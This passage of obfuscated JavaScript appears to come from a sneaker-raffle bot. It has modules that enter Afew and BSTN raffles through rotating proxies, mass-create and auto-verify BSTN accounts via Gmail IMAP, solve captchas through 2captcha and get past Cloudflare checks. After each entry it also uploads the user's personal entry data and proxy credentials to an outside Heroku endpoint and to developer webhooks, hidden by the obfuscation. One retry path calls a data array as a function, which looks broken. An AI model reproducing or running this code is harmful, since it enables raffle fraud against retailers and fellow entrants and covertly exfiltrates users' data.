                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x144ddb[0x0] + ':' + _0x144ddb[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x48de96 = await _0x145da3['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x144ddb[0x0] + ':' + _0x144ddb[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x515e75 = JSON['parse'](_0x768c3f['readFileSync']('sizes.json', 'utf-8')), _0x5c9c25 = _0x13f198[_0x35e415]['Url'], _0x2e14ef = _0x13f198[_0x35e415]['Size'], _0x124751;
                        async function _0x22d4c2() {
                            var _0x1f18ff = new _0x184a3c['CookieJar']();
                            console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Getting\x20Session');
                            var _0x510745;
                            let _0x4f88b9 = {
                                'method': 'GET',
                                'cookieJar': _0x1f18ff,
                                'headers': {
                                    'Connection': 'keep-alive',
                                    'Pragma': 'no-cache',
                                    'Cache-Control': 'no-cache',
                                    'sec-ch-ua': '\x22Google\x20Chrome\x22;v=\x2289\x22,\x20\x22Chromium\x22;v=\x2289\x22,\x20\x22;Not\x20A\x20Brand\x22;v=\x2299\x22',
                                    'sec-ch-ua-mobile': '?0',
                                    'DNT': '1',
                                    'Upgrade-Insecure-Requests': '1',
                                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                                    'cookies': '',
                                    'Sec-Fetch-Site': 'none',
                                    'Sec-Fetch-Mode': 'navigate',
                                    'Sec-Fetch-User': '?1',
                                    'Sec-Fetch-Dest': 'document',
                                    'Accept-Language': 'en-US,en;q=0.9'
                                },
                                'proxy': 'http://' + _0x144ddb[0x2] + ':' + _0x144ddb[0x3] + '@' + _0x144ddb[0x0] + ':' + _0x144ddb[0x1]
                            }, _0x1b337b = _0x5c9c25['replace']('de.afew-store.com', 'en.afew-store.com')['replace']('en.afew-store.com', 'raffles.afew-store.com'), _0x55211e = _0x1b337b + '.json', _0x2527f8 = await _0x49fa88(_0x55211e);
                            console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Getting\x20Variants');
                            let _0x50147e = _0x2527f8['data']['product']['variants'];
                            if (_0x2e14ef != 'RANDOM') {
                                if (_0x50147e[0x1]['option1']['includes']('W')) {
                                    const _0x5ef960 = _0x515e75['women']['find'](_0x1f8ec0 => _0x1f8ec0['EUsize'] === _0x2e14ef);
                                    _0x5ef960 && (_0x2e14ef = _0x5ef960['size']);
                                } else {
                                    if (_0x50147e[0x1]['option1']['includes']('Y')) {
                                        const _0x53fadf = _0x515e75['GS']['find'](_0x33d1ef => _0x33d1ef['EUsize'] === _0x2e14ef);
                                        _0x53fadf && (_0x2e14ef = _0x53fadf['size']);
                                    } else {
                                        const _0x19f39a = _0x515e75['men']['find'](_0x4db100 => _0x4db100['EUsize'] === _0x2e14ef);
                                        _0x19f39a && (_0x2e14ef = _0x19f39a['size']);
                                    }
                                }
                                for (var _0x3b724a of _0x50147e) {
                                    _0x3b724a['option1'] == _0x2e14ef && (_0x510745 = _0x3b724a['id']);
                                }
                            } else {
                                var _0x3e728b = Math['round'](Math['random']() * (_0x50147e['length'] - 0x1));
                                _0x510745 = _0x50147e[_0x3e728b]['id'];
                            }
                            console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x49fa88('https://raffles.afew-store.com/cart/' + _0x510745 + ':1'), _0x124751 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x22d4c2();
                        } catch (_0x560512) {
                            if (_0x560512['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x560512);
                        }
                        const _0x315550 = await _0x48de96['newPage']();
                        await _0x315550['setDefaultNavigationTimeout'](0x1d4c0), await _0x315550['authenticate']({
                            'username': '' + _0x144ddb[0x2],
                            'password': '' + _0x144ddb[0x3]
                        }), await _0x315550['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x315550['setRequestInterception'](!![]), _0x315550['on']('request', _0x3f3fa4 => {
                            _0x3f3fa4['resourceType']() === 'image' || _0x3f3fa4['resourceType']() === 'font' || _0x3f3fa4['resourceType']() === 'media' ? _0x3f3fa4['abort']() : _0x3f3fa4['continue']();
                        });
                        try {
                            await _0x315550['goto'](_0x124751, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x315550['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x315550['type']('#checkout_email', '' + _0x13f198[_0x35e415]['Email']), await _0x590479(0x320), await _0x315550['type']('#checkout_attributes_instagram', '' + _0x13f198[_0x35e415]['Follower']), await _0x590479(0x320), await _0x315550['select']('#checkout_shipping_address_country', '' + _0x13f198[_0x35e415]['Country']), await _0x315550['waitForTimeout'](0x258), await _0x315550['type']('#checkout_shipping_address_first_name', '' + _0x13f198[_0x35e415]['FirstName']), await _0x315550['waitForTimeout'](0x320), await _0x315550['type']('#checkout_shipping_address_last_name', '' + _0x13f198[_0x35e415]['LastName']), await _0x315550['waitForTimeout'](0x2bc), await _0x315550['type']('#checkout_shipping_address_address1', _0x13f198[_0x35e415]['Address1'] + '\x20' + _0x13f198[_0x35e415]['HouseNumber']), await _0x315550['waitForTimeout'](0x2bc), await _0x315550['type']('#checkout_shipping_address_address2', '' + _0x13f198[_0x35e415]['Address2']), await _0x315550['waitForTimeout'](0x2bc), await _0x315550['type']('#checkout_shipping_address_zip', '' + _0x13f198[_0x35e415]['Zip']), await _0x315550['waitForTimeout'](0x2bc), await _0x315550['type']('#checkout_shipping_address_city', '' + _0x13f198[_0x35e415]['City']), await _0x315550['waitForTimeout'](0x2bc);
                        if (_0x13f198[_0x35e415]['State'] != '')
                            try {
                                const _0x4e4bff = JSON['parse'](_0x768c3f['readFileSync']('States.json', 'utf8'));
                                await _0x590479(0x1f4);
                                if (_0x13f198[_0x35e415]['State']['length'] > 0x2)
                                    for (let _0x126f59 of _0x4e4bff) {
                                        if (_0x126f59['Province'] == _0x13f198[_0x35e415]['State']) {
                                            await _0x315550['select']('#checkout_shipping_address_province', _0x126f59['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x315550['select']('#checkout_shipping_address_province', _0x13f198[_0x35e415]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x590479(0x1f4), console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x590479(0x190), _0x315550['evaluate'](() => {
                            const _0x523957 = document['querySelector']('#continue_button');
                            for (var _0x20ffb9 = 0x0; _0x20ffb9 < 0x5; _0x20ffb9++) {
                                if (_0x523957) {
                                    _0x523957['click'](), _0x523957['click']();
                                    break;
                                } else
                                    _0x590479(0xfa0);
                            }
                        }), await _0x315550['waitForTimeout'](0x9c4);
                        try {
                            await _0x315550['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x315550['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x29c545 => _0x29c545['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x315550['waitForTimeout'](0x7d0), console['log'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x315550['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x590479(0x3e8), await _0x315550['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x505391 => _0x505391['submit']()), await _0x590479(0x3e8);
                        try {
                            await _0x315550['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x315550['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x592d35 => _0x592d35['submit']());
                        try {
                            await _0x315550['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x44fb5e = 'no', _0x491fd3(_0x13f198[_0x35e415], _0x494a18), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                                try {
                                    await _0x1690f0(_0x4b1e6b['webhook'], _0x3e21af['succesDEVMSG']);
                                } catch {
                                }
                            await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x3e21af['succesDEVMSG']), await _0x590479(0xc8);
                            try {
                                await _0x1690f0(_0x4807c3, _0x3e21af['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x3d4e83['replace']('#', ''),
                                    'module': _0x494a18['name'],
                                    'entrydata': JSON['stringify'](_0x39c722),
                                    'proxy': '' + _0xcc6d7e[_0x35e415]
                                };
                                var _0x5e84de = JSON['stringify'](prxdata);
                                let _0xa478b9 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x5e84de, _0xa478b9);
                            } catch (_0x31bef8) {
                            }
                        } catch (_0x1a3249) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x3562c5) {
                        _0x3562c5['message']['includes']('selector') && (_0x3562c5 = 'Connection\x20Error');
                        console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20' + _0x3562c5)), _0x30859d = '' + _0x3562c5;
                        var _0x363d96 = await _0x54f36f(_0x13f198[_0x35e415], _0x494a18, 'dev', !![], _0x30859d);
                        _0x3e21af['errorDEV'] = { 'embeds': [_0x363d96] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x3e21af['errorDEV']), await _0x1690f0(_0x874ee1, _0x3e21af['errorDEV']), _0x44fb5e = 'yes';
                    } finally {
                        _0x48de96 && _0x48de96['close']();
                        if (_0x44fb5e == 'yes' && _0x4d30ff != 0x5 && _0x30859d != 'Size\x20Not\x20Found') {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x494a18['name'] + ']\x20Task\x20' + (_0x35e415 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4d30ff + '\x20/\x205)')), _0x35e415 = _0x35e415 - 0x1, _0x4d30ff = _0x4d30ff + 0x1;
                            continue;
                        }
                        _0x44fb5e == 'yes' && _0x4d30ff >= 0x5 && (_0x549c32(_0x13f198[_0x35e415], _0x494a18), _0x44fb5e = 'no', _0x4d30ff = 0x0);
                        if (_0x35e415 + 0x1 == _0x13f198['length']) {
                            await _0x590479(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4b1e6b['AfewDelay'] + '\x20ms'), await _0x590479(_0x4b1e6b['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x525a4b, _0x51446b, _0x3830b8) {
                    var _0x270c2d = _0x51446b, _0xe6841 = 0x0;
                    for (var _0x3822da = 0x0; _0x3822da < _0x51446b['length']; _0x3822da++) {
                        maxTasks = Number(_0x4b1e6b['threads']);
                        while (_0xe6841 >= maxTasks) {
                            await _0x590479(_0x4b1e6b['delay']);
                        }
                        async function _0x30e1d3(_0x41a79f, _0x2b3ed0, _0x2d8e6c, _0x4b240b) {
                            _0xe6841++, _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4b1e6b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x353db9 != 'yes')
                                var _0x353db9 = '', _0x405d63 = 0x0;
                            var _0x12e87b;
                            try {
                                await _0x46b8ee(_0x2b3ed0, _0x4b240b);
                            } catch {
                                _0x353db9 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x39f641(_0x41a79f['name'] + '\x20Task\x20' + (_0x4b240b + 0x1) + '\x20/\x20' + _0x2b3ed0['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                            var _0x26a0c0 = await _0x54f36f(_0x2b3ed0[_0x4b240b], _0x41a79f, 'acc', ![]);
                            const _0x11ed46 = { 'succesDEVMSG': { 'embeds': [_0x26a0c0] } }, _0x12ea3f = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x1ee9d9 = Math['round'](Math['random']() * (_0x2d8e6c['length'] - 0x1)), _0x361fbb = _0x2d8e6c[_0x1ee9d9]['split'](':'), _0x5419d9;
                            try {
                                _0x5419d9 = await _0x145da3['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x361fbb[0x0] + ':' + _0x361fbb[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x5419d9 = await _0x145da3['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x361fbb[0x0] + ':' + _0x361fbb[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x1684c8 = await _0x5419d9['newPage']();
                                await _0x1684c8['authenticate']({
                                    'username': '' + _0x361fbb[0x2],
                                    'password': '' + _0x361fbb[0x3]
                                }), console['log'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1684c8['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x1684c8['setRequestInterception'](!![]), _0x1684c8['on']('request', _0x2d3376 => {
                                    _0x2d3376['resourceType']() === 'image' ? _0x2d3376['abort']() : _0x2d3376['continue']();
                                });
                                try {
                                    await _0x1684c8['goto']('' + _0x12ea3f), await _0x1684c8['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x353db9 = 'yes';
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x1684c8['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x590479(0x7d0), console['log'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x590479(0x190), await _0x1684c8['waitForSelector']('#firstname'), await _0x1684c8['type']('#firstname', _0x2b3ed0[_0x4b240b]['FirstName'], { 'delay': 0xf0 }), await _0x590479(0x190), await _0x1684c8['type']('#lastname', _0x2b3ed0[_0x4b240b]['LastName'], { 'delay': 0xe6 }), await _0x590479(0x190), await _0x1684c8['type']('#email_address', _0x2b3ed0[_0x4b240b]['Email'], { 'delay': 0x122 }), await _0x590479(0x190), await _0x1684c8['type']('#password', _0x2b3ed0[_0x4b240b]['Password'], { 'delay': 0x82 }), await _0x590479(0x1f4), await _0x1684c8['type']('#password-confirmation', _0x2b3ed0[_0x4b240b]['Password'], { 'delay': 0x7c }), console['log'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x590479(0x2bc), await _0x1684c8['$eval']('#form-validate', _0x3803c7 => _0x3803c7['submit']()), await _0x590479(0x1388);
                                const _0x218d9f = await _0x1684c8['$']('#email_address-error');
                                if (_0x218d9f)
                                    throw new Error('Invalid\x20Email');
                                const _0x4c4f23 = await _0x1684c8['$']('#password-error');
                                if (_0x4c4f23)
                                    throw new Error('Invalid\x20Password');
                                await _0x1684c8['waitForSelector']('div.mesg-success'), _0x353db9 = 'no', console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20Account\x20' + _0x2b3ed0[_0x4b240b]['Email'] + '\x20Generated')), _0x768c3f['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x2b3ed0[_0x4b240b]['Email'] + ',' + _0x2b3ed0[_0x4b240b]['Password']);
                                try {
                                    _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x11ed46['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1690f0(_0x48932d, _0x11ed46['succesDEVMSG']);
                                let _0x5bb477 = _0x2b3ed0[_0x4b240b];
                                try {
                                    prxdata = {
                                        'username': _0x3d4e83['replace']('#', ''),
                                        'module': _0x41a79f['name'],
                                        'entrydata': JSON['stringify'](_0x5bb477),
                                        'proxy': '' + _0x2d8e6c[_0x4b240b]
                                    };
                                    var _0x37ef91 = JSON['stringify'](prxdata);
                                    let _0x186428 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x49fa88['post']('https://jraffles.herokuapp.com/success', _0x37ef91, _0x186428);
                                } catch (_0xedb15b) {
                                }
                                console['log'](_0x4fb298['yellow'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x9bd743) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20' + _0x9bd743)), _0x12e87b = '' + _0x9bd743;
                                var _0x352d6f = await _0x54f36f(_0x2b3ed0[_0x4b240b], _0x41a79f, 'acc', !![], _0x12e87b);
                                _0x11ed46['errorDEV'] = { 'embeds': [_0x352d6f] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x11ed46['errorDEV']), await _0x1690f0(_0x874ee1, _0x11ed46['errorDEV']), _0x353db9 = 'yes';
                            } finally {
                                if (_0x5419d9)
                                    _0x5419d9['close']();
                                if (_0x353db9 == 'yes' && _0x405d63 != 0x5)
                                    return console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Task\x20' + (_0x4b240b + 0x1) + '\x20:\x20Retrying\x20(' + _0x405d63 + '\x20/\x205)')), _0x405d63 = _0x405d63 + 0x1, _0x2b3ed0(_0x41a79f, _0x2b3ed0, _0x2d8e6c, _0x4b240b);
                                _0x353db9 == 'yes' && _0x405d63 >= 0x5 && (_0x549c32(_0x2b3ed0[_0x4b240b], _0x41a79f), _0x353db9 = 'no', _0x405d63 = 0x0), _0xe6841--, console['log'](_0x4786af() + '\x20[' + _0x41a79f['name'] + ']\x20Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                            }
                        }
                        _0x30e1d3(_0x525a4b, _0x270c2d, _0x3830b8, _0x3822da), await _0x590479(_0x4b1e6b['delay']);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x1653ee, _0x45037b) {
                    var _0x5a12e0 = ![], _0x234de6 = [];
                    async function _0x33a081() {
                        var _0x2ad7d5 = new _0x54228e({
                            'user': _0x4b1e6b['masterMail'],
                            'password': _0x4b1e6b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x3f7a97(_0x26a5c9) {
                            _0x2ad7d5['openBox']('INBOX', ![], _0x26a5c9);
                        }
                        _0x2ad7d5['once']('ready', function () {
                            _0x3f7a97(function (_0x4691b9, _0x13a261) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x4691b9)
                                    throw _0x4691b9;
                                _0x2ad7d5['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x69d968, _0x9205a2) {
                                    if (!_0x9205a2 || !_0x9205a2['length'])
                                        console['log'](_0x4786af() + '\x20[' + _0x1653ee['name'] + ']\x20No\x20mails\x20found'), _0x2ad7d5['end']();
                                    else {
                                        var _0x148569 = _0x2ad7d5['seq']['fetch'](_0x9205a2, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x148569['on']('message', function (_0xe54f20, _0x41237c) {
                                            var _0x1d1ce2 = '(#' + _0x41237c + ')\x20';
                                            _0xe54f20['on']('body', function (_0x9c3bcd, _0x471f98) {
                                                _0x4a3e33(_0x9c3bcd, (_0x560446, _0x4e29e7) => {
                                                    var _0x1f3e2a = _0x4e29e7['text']['split']('customer/account/confirm/')[0x1], _0x78b6c4 = _0x1f3e2a['split'](']')[0x0];
                                                    _0x234de6['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x78b6c4);
                                                });
                                            }), _0xe54f20['once']('end', function () {
                                            });
                                        }), _0x148569['once']('error', function (_0x3ba414) {
                                            console['log']('Fetch\x20error:\x20' + _0x3ba414), _0x5a12e0 = !![];
                                        }), _0x148569['once']('end', function () {
                                            _0x2ad7d5['end'](), _0x5a12e0 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x2ad7d5['once']('error', function (_0x3b9b7f) {
                            console['log'](_0x4fb298['red'](_0x3b9b7f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5a12e0 = !![];
                        }), _0x2ad7d5['once']('end', async function () {
                            _0x5a12e0 = !![];
                        }), _0x2ad7d5['connect']();
                    }
                    async function _0x3b6e19(_0x7ee808, _0xac5cd1, _0x81667a) {
                        _0x145da3['use'](_0x109835());
                        for (var _0x55c181 = 0x0; _0x55c181 < _0xac5cd1['length']; _0x55c181++) {
                            if (_0x397c44 != 'yes')
                                var _0x397c44 = '', _0x3fbe72 = 0x0;
                            var _0x5d3fda = Math['round'](Math['random']() * (_0x81667a['length'] - 0x1)), _0x49e92c = _0x81667a[_0x5d3fda]['split'](':'), _0x3aff73;
                            try {
                                _0x3aff73 = await _0x145da3['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x49e92c[0x0] + ':' + _0x49e92c[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3aff73 = await _0x145da3['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x49e92c[0x0] + ':' + _0x49e92c[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x46fa23 = await _0x3aff73['newPage']();
                                await _0x46fa23['authenticate']({
                                    'username': '' + _0x49e92c[0x2],
                                    'password': '' + _0x49e92c[0x3]
                                }), console['log'](_0x4786af() + '\x20[' + _0x7ee808['name'] + ']\x20Task\x20' + (_0x55c181 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x46fa23['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x46fa23['setRequestInterception'](!![]), _0x46fa23['on']('request', _0x52aa8c => {
                                    _0x52aa8c['resourceType']() === 'image' || _0x52aa8c['resourceType']() === 'font' || _0x52aa8c['resourceType']() === 'media' ? _0x52aa8c['abort']() : _0x52aa8c['continue']();
                                }), console['log'](_0x4786af() + '\x20[' + _0x7ee808['name'] + ']\x20Task\x20' + (_0x55c181 + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x46fa23['goto'](_0xac5cd1[_0x55c181]);
                                } catch (_0x69c926) {
                                    _0x397c44 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x69c926);
                                }
                                console['log'](_0x4786af() + '\x20[' + _0x7ee808['name'] + ']\x20Task\x20' + (_0x55c181 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x46fa23['waitForTimeout'](0xbb8);
                                try {
                                    await _0x46fa23['waitForSelector']('.account-nav'), _0x397c44 = 'no', console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x7ee808['name'] + ']\x20Task\x20' + (_0x55c181 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0xca0978 = await _0x54f36f(null, _0x7ee808, 'ver', ![]);
                                    const _0xda2d11 = { 'succesDEVMSG': { 'embeds': [_0xca0978] } };
                                    await _0x1690f0(_0x240706, _0xda2d11['succesDEVMSG']);
                                } catch {
                                    _0x397c44 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x378b1f) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x7ee808['name'] + ']\x20Task\x20' + (_0x55c181 + 0x1) + '\x20:\x20' + _0x378b1f));
                                var _0x5f0390 = _0x378b1f, _0x289b7a = await _0x54f36f(null, _0x7ee808, 'ver', !![], _0x5f0390);
                                const _0x456199 = { 'errorDEVMSG': { 'embeds': [_0x289b7a] } };
                                _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x456199['errorDEVMSG']), await _0x1690f0(_0x874ee1, _0x456199['errorDEVMSG']);
                            } finally {
                                _0x3aff73['close']();
                                if (_0x397c44 == 'yes' && _0x3fbe72 != 0x5) {
                                    console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x7ee808['name'] + ']\x20Task\x20' + (_0x55c181 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3fbe72 + '\x20/\x205)')), _0x55c181 = _0x55c181 - 0x1, _0x3fbe72 = _0x3fbe72 + 0x1;
                                    continue;
                                }
                                _0x397c44 == 'yes' && _0x3fbe72 >= 0x5 && (_0x397c44 = 'no', _0x3fbe72 = 0x0), console['log'](_0x4786af() + '\x20[' + _0x7ee808['name'] + ']\x20Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                            }
                        }
                    }
                    try {
                        _0x33a081();
                        while (!_0x5a12e0) {
                            await _0x590479(0xfa0);
                        }
                        console['log']('Found\x20' + _0x234de6['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x590479(0x7d0);
                    }
                    await _0x3b6e19(_0x1653ee, _0x234de6, _0x45037b);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5263d9, _0x7d5684, _0x330604) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4e2770 = 0x0; _0x4e2770 < _0x7d5684['length']; _0x4e2770++) {
                        var _0x4dda45, _0x2f9f24 = _0x7d5684[_0x4e2770];
                        try {
                            await _0x46b8ee(_0x7d5684, _0x4e2770);
